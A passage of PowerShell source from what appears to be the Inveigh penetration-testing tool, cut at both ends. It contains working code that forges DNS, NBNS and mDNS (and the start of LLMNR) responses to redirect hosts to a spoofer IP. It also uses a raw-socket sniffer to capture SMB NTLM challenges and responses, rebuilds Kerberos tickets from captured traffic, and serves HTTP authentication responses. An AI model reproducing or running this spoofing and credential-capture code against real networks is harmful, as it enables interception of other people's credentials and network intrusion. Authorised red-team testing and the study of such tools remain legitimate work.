$packet_HTTPResponse = New-Object System.Collections.Specialized.OrderedDictionary\n            $packet_HTTPResponse.Add(\"HTTPResponse_ResponseVersion\",[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))\n            $packet_HTTPResponse.Add(\"HTTPResponse_StatusCode\",$HTTP_response_status_code + [Byte[]](0x20))\n            $packet_HTTPResponse.Add(\"HTTPResponse_ResponsePhrase\",$HTTP_response_phrase + [Byte[]](0x0d,0x0a))\n\n            if($HTTP_connection_header_close)\n            {\n                $HTTP_connection_header = [System.Text.Encoding]::UTF8.GetBytes(\"Connection: close\")\n                $packet_HTTPResponse.Add(\"HTTPResponse_Connection\",$HTTP_connection_header + [Byte[]](0x0d,0x0a))\n            }\n\n            $packet_HTTPResponse.Add(\"HTTPResponse_Server\",[System.Text.Encoding]::UTF8.GetBytes(\"Server: Microsoft-HTTPAPI/2.0\") + [Byte[]](0x0d,0x0a))\n            $packet_HTTPResponse.Add(\"HTTPResponse_TimeStamp\",[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + $HTTP_timestamp + [Byte[]](0x0d,0x0a))\n            $packet_HTTPResponse.Add(\"HTTPResponse_ContentLength\",[System.Text.Encoding]::UTF8.GetBytes(\"Content-Length: $($HTTP_message_bytes.Length)\") + [Byte[]](0x0d,0x0a))\n\n            if($HTTP_header_authenticate -and $HTTP_header_authenticate_data)\n            {\n                $packet_HTTPResponse.Add(\"HTTPResponse_AuthenticateHeader\",$HTTP_header_authenticate + $HTTP_header_authenticate_data + [Byte[]](0x0d,0x0a))\n            }\n\n            if($HTTP_header_content_type)\n            {\n                $packet_HTTPResponse.Add(\"HTTPResponse_ContentType\",$HTTP_header_content_type + [Byte[]](0x0d,0x0a))\n            }\n\n            if($HTTP_header_cache_control)\n            {\n                $packet_HTTPResponse.Add(\"HTTPResponse_CacheControl\",$HTTP_header_cache_control + [Byte[]](0x0d,0x0a))\n            }\n\n            if($HTTP_send)\n            {\n                $packet_HTTPResponse.Add(\"HTTPResponse_Message\",[Byte[]](0x0d,0x0a) + $HTTP_message_bytes)\n                $HTTP_response = ConvertFrom-PacketOrderedDictionary $packet_HTTPResponse\n                $HTTP_stream.Write($HTTP_response,0,$HTTP_response.Length)\n                $HTTP_stream.Flush()\n            }\n\n            Start-Sleep -m 10\n            $HTTP_request_raw_URL_old = $HTTP_request_raw_URL\n\n            if($HTTP_client_close)\n            {\n                \n                if($proxy_listener)\n                {\n                    $HTTP_client.Client.Close()\n                }\n                else\n                {\n                    $HTTP_client.Close()\n                }\n\n            }\n\n        }\n        else\n        {\n\n            if($HTTP_client_handle_old -eq $HTTP_client.Client.Handle)\n            {\n                $HTTP_reset++\n            }\n            else\n            {\n                $HTTP_reset = 0\n            }\n\n            if($HTTP_connection_header_close -or $HTTP_reset -gt 20)\n            {\n                \n                $HTTP_client.Close()\n                $HTTP_reset = 0\n            }\n            else\n            {\n                Start-Sleep -m 100\n            }\n            \n        }\n    \n    }\n\n    $HTTP_client.Close()\n    $HTTP_listener.Stop()\n}\n\n# Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer\n$sniffer_scriptblock = \n{\n    param ($DNS,$DNSTTL,$EvadeRG,$Inspect,$IP,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$LLMNR,\n            $LLMNRTTL,$mDNS,$mDNSTypes,$mDNSTTL,$NBNS,$NBNSTTL,$NBNSTypes,$output_directory,$Pcap,\n            $PcapTCP,$PcapUDP,$SMB,$SpooferHostsIgnore,$SpooferHostsReply,$SpooferIP,\n            $SpooferIPsIgnore,$SpooferIPsReply,$SpooferLearning,$SpooferLearningDelay,$SpooferLearningInterval,\n            $SpooferNonprintable,$SpooferThresholdHost,$SpooferThresholdNetwork)\n\n    $sniffer_running = $true\n    $byte_in = New-Object System.Byte[] 4\t\n    $byte_out = New-Object System.Byte[] 4\t\n    $byte_data = New-Object System.Byte[] 65534\n    $byte_in[0] = 1\n    $byte_in[1-3] = 0\n    $byte_out[0] = 1\n    $byte_out[1-3] = 0\n    $sniffer_socket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)\n    $sniffer_socket.SetSocketOption(\"IP\",\"HeaderIncluded\",$true)\n    $sniffer_socket.ReceiveBufferSize = 65534\n\n    if($Kerberos -eq 'Y')\n    {\n\n        if($KerberosHash)\n        {\n            $kerberos_base_key = (&{for ($i = 0;$i -lt $KerberosHash.Length;$i += 2){$KerberosHash.SubString($i,2)}}) -join \"-\"\n            $kerberos_base_key = $kerberos_base_key.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n        }\n        elseif($KerberosCredential)\n        {\n            $kerberos_base_key = Get-KerberosAES256BaseKey ($KerberosCredential.UserName).Trim(\"\\\") $KerberosCredential.Password\n        }\n\n    }\n\n    try\n    {\n        $end_point = New-Object System.Net.IPEndpoint([System.Net.IPAddress]\"$IP\",0)\n    }\n    catch\n    {\n        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] Error starting sniffer/spoofer\") > $null\n        $error_message = $_.Exception.Message\n        $error_message = $error_message -replace \"`n\",\"\"\n        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        $sniffer_running = $false\n    }\n\n    $sniffer_socket.Bind($end_point)\n    $sniffer_socket.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)\n    $DNS_TTL_bytes = [System.BitConverter]::GetBytes($DNSTTL)\n    [Array]::Reverse($DNS_TTL_bytes)\n    $LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)\n    [Array]::Reverse($LLMNR_TTL_bytes)\n    $mDNS_TTL_bytes = [System.BitConverter]::GetBytes($mDNSTTL)\n    [Array]::Reverse($mDNS_TTL_bytes)\n    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)\n    [Array]::Reverse($NBNS_TTL_bytes)\n    $LLMNR_learning_log = New-Object System.Collections.Generic.List[string]\n    $NBNS_learning_log = New-Object System.Collections.Generic.List[string]\n\n    if($SpooferLearningDelay)\n    {    \n        $spoofer_learning_delay = New-TimeSpan -Minutes $SpooferLearningDelay\n        $spoofer_learning_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()\n    }\n\n    [Byte[]]$pcap_header = 0xd4,0xc3,0xb2,0xa1,0x02,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff +\n        0xff,0x00,0x00,0x01,0x00,0x00,0x00\n\n    if($Pcap -eq 'File')\n    {\n        $pcap_path = $output_directory + \"\\Inveigh-Packets.pcap\"\n        $pcap_file_check = [System.IO.File]::Exists($pcap_path)\n        \n        try\n        {\n            $pcap_file = New-Object System.IO.FileStream $pcap_path,'Append','Write','Read'\n\n            if(!$pcap_file_check)\n            {\n                $pcap_file.Write($pcap_header,0,$pcap_header.Count)\n            }\n\n        }\n        catch\n        {\n            $error_message = $_.Exception.Message\n            $error_message = $error_message -replace \"`n\",\"\"\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Disabling pcap output\") > $null\n            $Pcap = ''\n        }\n\n    }\n    elseif($Pcap -eq 'Memory' -and !$inveigh.pcap)\n    {\n        $inveigh.pcap = New-Object System.Collections.ArrayList\n        $inveigh.pcap.AddRange($pcap_header)\n    }\n\n    while($inveigh.running -and $sniffer_running)\n    {\n        $packet_length = $sniffer_socket.Receive($byte_data,0,$byte_data.Length,[System.Net.Sockets.SocketFlags]::None)\n        $memory_stream = New-Object System.IO.MemoryStream($byte_data,0,$packet_length)\n        $binary_reader = New-Object System.IO.BinaryReader($memory_stream)\n        $version_HL = $binary_reader.ReadByte()\n        $binary_reader.ReadByte() > $null\n        $total_length = Convert-DataToUInt16 $binary_reader.ReadBytes(2)\n        $binary_reader.ReadBytes(5) > $null\n        $protocol_number = $binary_reader.ReadByte()\n        $binary_reader.ReadBytes(2) > $null\n        $source_IP_bytes = $binary_reader.ReadBytes(4)\n        $source_IP = [System.Net.IPAddress]$source_IP_bytes\n        $destination_IP_bytes = $binary_reader.ReadBytes(4)\n        $destination_IP = [System.Net.IPAddress]$destination_IP_bytes\n        $header_length = [Int]\"0x$(('{0:X}' -f $version_HL)[1])\" * 4\n        \n        switch($protocol_number)\n        {\n            \n            6 \n            {  # TCP\n                $source_port = Convert-DataToUInt16 $binary_reader.ReadBytes(2)\n                $destination_port = Convert-DataToUInt16 $binary_reader.ReadBytes(2)\n                $binary_reader.ReadBytes(8) > $null\n                $TCP_header_length = [Int]\"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])\" * 4\n                $TCP_flags = $binary_reader.ReadByte()\n                $binary_reader.ReadBytes($TCP_header_length - 14) > $null\n                $payload_bytes = $binary_reader.ReadBytes($packet_length)\n                $TCP_flags = ([convert]::ToString($TCP_flags,2)).PadLeft(8,\"0\")\n\n                if($TCP_flags.SubString(6,1) -eq \"1\" -and $TCP_flags.SubString(3,1) -eq \"0\" -and $destination_IP -eq $IP)\n                {\n                    $TCP_session = \"$source_IP`:$source_port\"\n                    $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] TCP($destination_port) SYN packet detected from $TCP_Session\") > $null\n                }\n\n                switch ($destination_port)\n                {\n\n                    139 \n                    {\n\n                        if($payload_bytes)\n                        {\n                            Get-SMBConnection $payload_bytes $IP $source_IP $destination_IP $source_port \"139\"\n                        }\n\n                        if($inveigh.SMB_session_table.ContainsKey(\"$source_IP`:$source_port\"))\n                        {\n                            Get-NTLMResponse $payload_bytes $SMB $source_IP $source_port 139 \"SMB\"\n                        }\n\n                    }\n\n                    445\n                    {\n\n                        if($kerberos_data.Count -lt $kerberos_length -and \"$source_IP`:$source_port\" -eq $kerberos_source)\n                        {\n                            $kerberos_data += $payload_bytes\n\n                            if($kerberos_data.Count -ge $kerberos_length)\n                            {\n                                New-KerberosKirbi $kerberos_data $kerberos_base_key \"SMB\" 445 \"$source_IP`:$source_port\"\n                                $kerberos_length = $null\n                                $kerberos_data = $null\n                                $kerberos_source = $null\n                            }\n\n                        }\n\n                        if($payload_bytes)\n                        {   \n                            $kerberos_connection = Get-SMBConnection $payload_bytes $IP $source_IP $destination_IP $source_port \"445\"\n                            $kerberos_length = $kerberos_connection[0]\n                            $kerberos_data = $kerberos_connection[1]\n                            $kerberos_source = \"$source_IP`:$source_port\"\n                        }\n\n                        if($inveigh.SMB_session_table.ContainsKey(\"$source_IP`:$source_port\"))\n                        {\n                            Get-NTLMResponse $payload_bytes $SMB $source_IP $source_port 445 \"SMB\"\n                        }\n                    \n                    }\n\n                }\n\n                # Outgoing packets\n                switch ($source_port)\n                {\n\n                    139 \n                    {\n\n                        if($payload_bytes)\n                        {\n                            $NTLM_challenge = Get-SMBNTLMChallenge $payload_bytes\n                        }\n\n                        if($NTLM_challenge -and $destination_IP -ne $source_IP)\n                        {\n\n                            if($source_IP -eq $IP)\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $NTLM_challenge sent to $destination_IP`:$destination_port\") > $null\n                            }\n                            else\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $NTLM_challenge received from $destination_IP`:$destination_port\") > $null\n                            }\n\n                            $inveigh.SMB_session_table.\"$destination_IP`:$destination_port\" = $NTLM_challenge\n                            $NTLM_challenge = $null\n                        }\n                    \n                    }\n\n                    445\n                    {\n\n                        if($payload_bytes)\n                        {\n                            $NTLM_challenge = Get-SMBNTLMChallenge $payload_bytes\n                        }\n\n                        if($NTLM_challenge -and $destination_IP -ne $source_IP)\n                        {\n\n                            if($source_IP -eq $IP)\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $NTLM_challenge sent to $destination_IP`:$destination_port\") > $null\n                            }\n                            else\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $NTLM_challenge received from $destination_IP`:$destination_port\") > $null\n                            }\n\n                            $inveigh.SMB_session_table.\"$destination_IP`:$destination_port\" = $NTLM_challenge                      \n                            $NTLM_challenge = $null\n                        }\n                        \n                    \n                    }\n                \n                }\n\n                if($Pcap -and ($PcapTCP -contains $source_port -or $PcapTCP -contains $destination_port -or $PcapTCP -contains 'All'))\n                {\n\n                    if($payload_bytes)\n                    {\n                        $pcap_epoch_time = ([datetime]::UtcNow)-(Get-Date \"1/1/1970\")\n                        $pcap_length = [System.BitConverter]::GetBytes($packet_length + 14)\n                        \n                        $pcap_packet = [System.BitConverter]::GetBytes([Int][Math]::Truncate($pcap_epoch_time.TotalSeconds)) + \n                            [System.BitConverter]::GetBytes($pcap_epoch_time.Milliseconds) + # should be microseconds but probably doesn't matter\n                            $pcap_length +\n                            $pcap_length +\n                            (,0x00 * 12) +\n                            0x08,0x00 +\n                            $byte_data[0..($packet_length - 1)]\n\n                        if($pcap_packet.Count -eq ($packet_length + 30))\n                        {\n\n                            switch ($Pcap)\n                            {\n\n                                'File'\n                                {\n\n                                    try\n                                    {\n                                        $pcap_file.Write($pcap_packet,0,$pcap_packet.Count)    \n                                    }\n                                    catch\n                                    {\n                                        $error_message = $_.Exception.Message\n                                        $error_message = $error_message -replace \"`n\",\"\"\n                                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n                                    }\n\n                                }\n\n                                'Memory'\n                                {\n                                    $inveigh.pcap.AddRange($pcap_packet) \n                                }\n\n                            }\n                            \n                        }\n\n                    }\n\n                }\n\n            }\n                \n            17 \n            {  # UDP\n                $source_port = $binary_reader.ReadBytes(2)\n                $endpoint_source_port = Convert-DataToUInt16 ($source_port)\n                $destination_port = Convert-DataToUInt16 $binary_reader.ReadBytes(2)\n                $UDP_length = $binary_reader.ReadBytes(2)\n                $UDP_length_uint  = Convert-DataToUInt16 ($UDP_length)\n                $binary_reader.ReadBytes(2) > $null\n                $payload_bytes = $binary_reader.ReadBytes(($UDP_length_uint - 2) * 4)\n\n                # Incoming packets \n                switch($destination_port)\n                {\n\n                    53 # DNS\n                    {\n                        $DNS_query_string = Get-NameQueryString 12 $payload_bytes\n                        $DNS_response_data = $payload_bytes[12..($DNS_query_string.Length + 13)]\n                        [Byte[]]$UDP_length = ([System.BitConverter]::GetBytes($DNS_response_data.Count + $DNS_response_data.Count + $SpooferIP.Length + 23))[1,0]\n                        $DNS_response_type = \"[+]\"\n\n                        $DNS_response_data += 0x00,0x01,0x00,0x01 +\n                                                $DNS_response_data +\n                                                0x00,0x01,0x00,0x01 +\n                                                $DNS_TTL_bytes +\n                                                0x00,0x04 +\n                                                ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()\n        \n                        $DNS_response_packet = 0x00,0x35 +\n                                                    $source_port[1,0] +\n                                                    $UDP_length +\n                                                    0x00,0x00 +\n                                                    $payload_bytes[0,1] +\n                                                    0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +\n                                                    $DNS_response_data\n\n\n                        $DNS_response_message = Get-SpooferResponseMessage -QueryString $DNS_query_string -Type \"DNS\" -Enabled $DNS\n                        $DNS_response_type = $DNS_response_message[0]\n                        $DNS_response_message = $DNS_response_message[1]\n\n                        if($DNS_response_message -eq '[response sent]')\n                        {\n                            $DNS_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)\n                            $DNS_send_socket.SendBufferSize = 1024\n                            $DNS_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port) \n                            $DNS_send_socket.SendTo($DNS_response_packet,$DNS_destination_point) > $null\n                            $DNS_send_socket.Close()\n                        }\n\n                        if($destination_IP -eq $IP)\n                        {\n                            $inveigh.output_queue.Add(\"$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string received from $source_IP $DNS_response_message\") > $null\n                        }\n                        else\n                        {\n                            $inveigh.output_queue.Add(\"$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string sent to $destination_IP [outgoing query]\") > $null\n                        }\n\n                    }\n\n                    137 # NBNS\n                    {\n                     \n                        if(([System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -or [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-00-00-01') -and [System.BitConverter]::ToString($payload_bytes[10..11]) -ne '00-01')\n                        {\n\n                            if([System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00')\n                            {\n                                $UDP_length[0] += 12\n                                $NBNS_response_type = \"[+]\"\n                            \n                                $NBNS_response_data = $payload_bytes[13..$payload_bytes.Length] +\n                                                        $NBNS_TTL_bytes +\n                                                        0x00,0x06,0x00,0x00 +\n                                                        ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()\n                    \n                                $NBNS_response_packet = 0x00,0x89 +\n                                                        $source_port[1,0] +\n                                                        $UDP_length[1,0] +\n                                                        0x00,0x00 +\n                                                        $payload_bytes[0,1] +\n                                                        0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +\n                                                        $NBNS_response_data\n                    \n                                $NBNS_query_type = [System.BitConverter]::ToString($payload_bytes[43..44])\n                                $NBNS_query_type = Get-NBNSQueryType $NBNS_query_type\n                                $NBNS_type = $payload_bytes[47]\n                                $NBNS_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.Length - 4)])\n                                $NBNS_query = $NBNS_query -replace \"-00\",\"\"\n                                $NBNS_query = $NBNS_query.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                                $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)\n                                $NBNS_query_string_encoded_check = $NBNS_query_string_encoded\n                                $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf(\"CA\"))                \n                                $NBNS_query_string_subtracted = $null\n                                $NBNS_query_string = $null\n                                $n = 0\n                                \n                                do\n                                {\n                                    $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)\n                                    $NBNS_query_string_subtracted += ([System.Convert]::ToString($NBNS_query_string_sub,16))\n                                    $n++\n                                }\n                                until($n -ge ($NBNS_query_string_encoded.Length))\n                        \n                                $n = 0\n                        \n                                do\n                                {\n                                    $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))\n                                    $n += 2\n                                }\n                                until($n -ge ($NBNS_query_string_subtracted.Length) -or $NBNS_query_string.Length -eq 15)\n\n                                if($NBNS_query_string_encoded_check.StartsWith(\"ABAC\") -and $NBNS_query_string_encoded_check.EndsWith(\"ACAB\"))\n                                {\n                                    $NBNS_query_string = $NBNS_query_string.Substring(2)\n                                    $NBNS_query_string = $NBNS_query_string.Substring(0, $NBNS_query_string.Length - 1)\n                                    $NBNS_query_string = \"<01><02>\" + $NBNS_query_string + \"<02>\"\n                                }\n\n                                if($NBNS_query_string -notmatch '[^\\x00-\\x7F]+')\n                                {\n\n                                    if(!$inveigh.request_table.ContainsKey($NBNS_query_string))\n                                    {\n                                        $inveigh.request_table.Add($NBNS_query_string.ToLower(),[Array]$source_IP.IPAddressToString)\n                                        $inveigh.request_table_updated = $true\n                                    }\n                                    else\n                                    {\n                                        $inveigh.request_table.$NBNS_query_string += $source_IP.IPAddressToString\n                                        $inveigh.request_table_updated = $true\n                                    }\n\n                                }\n\n                                $NBNS_request_ignore = $false\n                            }\n\n                            if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $NBNS_query_string -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -and $source_IP -ne $IP)\n                            {\n                            \n                                if(($NBNS_learning_log.Exists({param($s) $s -like \"20* $NBNS_query_string\"})))\n                                {\n                                    $NBNS_learning_queue_time = [DateTime]$NBNS_learning_log.Find({param($s) $s -like \"20* $NBNS_query_string\"}).SubString(0,19)\n\n                                    if((Get-Date) -ge $NBNS_learning_queue_time.AddMinutes($SpooferLearningInterval))\n                                    {\n                                        $NBNS_learning_log.RemoveAt($NBNS_learning_log.FindIndex({param($s) $s -like \"20* $NBNS_query_string\"}))\n                                        $NBNS_learning_send = $true\n                                    }\n                                    else\n                                    {\n                                        $NBNS_learning_send = $false\n                                    }\n\n                                }\n                                else\n                                {           \n                                    $NBNS_learning_send = $true\n                                }\n\n                                if($NBNS_learning_send)\n                                {\n                                    $NBNS_transaction_ID = [String](1..2 | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})\n                                    $NBNS_transaction_ID_bytes = $NBNS_transaction_ID.Split(\" \") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                                    $NBNS_transaction_ID = $NBNS_transaction_ID -replace \" \",\"-\"\n                                    $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137\n                                    $NBNS_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]\n\n                                    $NBNS_request_packet = $NBNS_transaction_ID_bytes +\n                                                            0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +\n                                                            $NBNS_hostname_bytes +\n                                                            0x00,0x20,0x00,0x01\n\n                                    $NBNS_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]::broadcast,137)\n                                    $NBNS_UDP_client.Connect($NBNS_learning_destination_endpoint)\n                                    $NBNS_UDP_client.Send($NBNS_request_packet,$NBNS_request_packet.Length)\n                                    $NBNS_UDP_client.Close()\n                                    $NBNS_learning_log.Add(\"$(Get-Date -format s) $NBNS_transaction_ID $NBNS_query_string\") > $null\n                                    $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] NBNS request $NBNS_query_string sent to \" + $NBNS_learning_destination_endpoint.Address.IPAddressToString) > $null\n                                }\n\n                            }\n\n                            $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type \"NBNS\" -Enabled $NBNS -NBNSType $NBNS_type\n                            $NBNS_response_type = $NBNS_response_message[0]\n                            $NBNS_response_message = $NBNS_response_message[1]\n\n                            if($NBNS_response_message -eq '[response sent]')\n                            {\n\n                                if($SpooferLearning -eq 'N' -or !$NBNS_learning_log.Exists({param($s) $s -like \"* \" + [System.BitConverter]::ToString($payload_bytes[0..1]) + \" *\"}))\n                                {\n                                    $NBNS_send_socket = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)\n                                    $NBNS_send_socket.SendBufferSize = 1024\n                                    $NBNS_destination_point = New-Object Net.IPEndpoint($source_IP,$endpoint_source_port)\n                                    $NBNS_send_socket.SendTo($NBNS_response_packet,$NBNS_destination_point) > $null\n                                    $NBNS_send_socket.Close()\n                                }\n                                else\n                                {\n                                    $NBNS_request_ignore = $true\n                                }\n                                \n                            }\n                            else\n                            {\n                                \n                                if($source_IP -eq $IP -and $NBNS_learning_log.Exists({param($s) $s -like \"* \" + [System.BitConverter]::ToString($payload_bytes[0..1]) + \" *\"}))\n                                {\n                                    $NBNS_request_ignore = $true\n                                }\n                                \n                            }\n\n                            if(!$NBNS_request_ignore -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00')\n                            {\n                                $inveigh.output_queue.Add(\"$NBNS_response_type [$(Get-Date -format s)] NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message\") > $null\n                            }\n                            elseif($SpooferLearning -eq 'Y' -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-00-00-01' -and $NBNS_learning_log.Exists({param($s) $s -like \"* \" + [System.BitConverter]::ToString($payload_bytes[0..1]) + \" *\"}))\n                            {\n                                [Byte[]]$NBNS_response_IP_bytes = $payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length)]\n                                $NBNS_response_IP = [System.Net.IPAddress]$NBNS_response_IP_bytes\n                                $NBNS_response_IP = $NBNS_response_IP.IPAddressToString\n\n                                if($inveigh.valid_host_list -notcontains $NBNS_query_string)\n                                {\n                                    $inveigh.valid_host_list.Add($NBNS_query_string) > $null\n                                    $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP [added to valid host list]\") > $null\n                                }\n\n                            }\n\n                        }\n\n                    }\n\n                    5353 # mDNS\n                    {   \n                        \n                        if(([System.BitConverter]::ToString($payload_bytes)).EndsWith(\"-00-01-80-01\") -and [System.BitConverter]::ToString($payload_bytes[4..11]) -eq \"00-01-00-00-00-00-00-00\")\n                        {\n                            $UDP_length[0] += 10\n                            $mDNS_query_string_full = Get-NameQueryString 12 $payload_bytes\n                            $mDNS_query_payload_bytes = $payload_bytes[12..($mDNS_query_string_full.Length + 13)]\n                            $mDNS_query_string = ($mDNS_query_string_full.Split(\".\"))[0]\n                            $UDP_length[0] = $mDNS_query_payload_bytes.Count + $SpooferIP.Length + 23\n                            $mDNS_response_type = \"[+]\"\n\n                            $mDNS_response_data = $mDNS_query_payload_bytes +\n                                                    0x00,0x01,0x00,0x01 +\n                                                    $mDNS_TTL_bytes +\n                                                    0x00,0x04 +\n                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()\n                        \n                            $mDNS_response_packet = 0x14,0xe9 +\n                                                    $source_port[1,0] +\n                                                    $UDP_length[1,0] +\n                                                    0x00,0x00 +\n                                                    $payload_bytes[0,1] +\n                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +\n                                                    $mDNS_response_data\n                            \n\n                            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type \"mDNS\" -mDNSType \"QU\" -Enabled $mDNS\n                            $mDNS_response_type = $mDNS_response_message[0]\n                            $mDNS_response_message = $mDNS_response_message[1]\n                            \n                            if($mDNS_response_message -eq '[response sent]')\n                            {\n                                $send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )\n                                $send_socket.SendBufferSize = 1024\n                                $destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port)\n                                $send_socket.SendTo($mDNS_response_packet,$destination_point) > $null\n                                $send_socket.Close()\n                            }\n\n                            $inveigh.output_queue.Add(\"$mDNS_response_type [$(Get-Date -format s)] mDNS(QU) request $mDNS_query_string_full received from $source_IP $mDNS_response_message\") > $null\n                        }\n                        elseif(([System.BitConverter]::ToString($payload_bytes)).EndsWith(\"-00-01\") -and ([System.BitConverter]::ToString(\n                            $payload_bytes[4..11]) -eq \"00-01-00-00-00-00-00-00\" -or [System.BitConverter]::ToString($payload_bytes[4..11]) -eq \"00-02-00-00-00-00-00-00\"))\n                        {\n                            $mDNS_query_string_full = Get-NameQueryString 12 $payload_bytes\n                            $mDNS_query_payload_bytes = $payload_bytes[12..($mDNS_query_string_full.Length + 13)]\n                            $mDNS_query_string = ($mDNS_query_string_full.Split(\".\"))[0]\n                            $UDP_length[0] = $mDNS_query_payload_bytes.Count + $SpooferIP.Length + 23\n                            $mDNS_response_type = \"[+]\"\n\n                            $mDNS_response_data = $mDNS_query_payload_bytes +\n                                                    0x00,0x01,0x80,0x01 +\n                                                    $mDNS_TTL_bytes +\n                                                    0x00,0x04 +\n                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()\n\n                        \n                            $mDNS_response_packet = 0x14,0xe9 +\n                                                    $source_port[1,0] +\n                                                    $UDP_length[1,0] +\n                                                    0x00,0x00 +\n                                                    $payload_bytes[0,1] +\n                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +\n                                                    $mDNS_response_data\n                   \n                            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type \"mDNS\" -mDNSType \"QM\" -Enabled $mDNS\n                            $mDNS_response_type = $mDNS_response_message[0]\n                            $mDNS_response_message = $mDNS_response_message[1]\n                            \n                            if($mDNS_response_message -eq '[response sent]')\n                            {\n                                $send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)\n                                $send_socket.SendBufferSize = 1024\n                                $destination_point = New-Object System.Net.IPEndpoint([IPAddress]\"224.0.0.251\",5353)\n                                $send_socket.SendTo($mDNS_response_packet,$destination_point) > $null\n                                $send_socket.Close()\n                            }\n\n                            $inveigh.output_queue.Add(\"$mDNS_response_type [$(Get-Date -format s)] mDNS(QM) request $mDNS_query_string_full received from $source_IP $mDNS_response_message\") > $null\n                        }\n                        \n                    }\n\n                    5355 # LLMNR\n                    {\n\n                        if([System.BitConverter]::ToString($payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length - 3)]) -ne '00-1c') # ignore AAAA for now\n                        {\n                            $UDP_length[0] += $payload_bytes.Length - 2\n                            $LLMNR_response_data = $payload_bytes[12..$payload_bytes.Length]\n                            $LLMNR_response_type = \"[+]\"\n\n                            $LLMNR_response_data += $LLMNR_response_data +\n                                                    $LLMNR_TTL_bytes 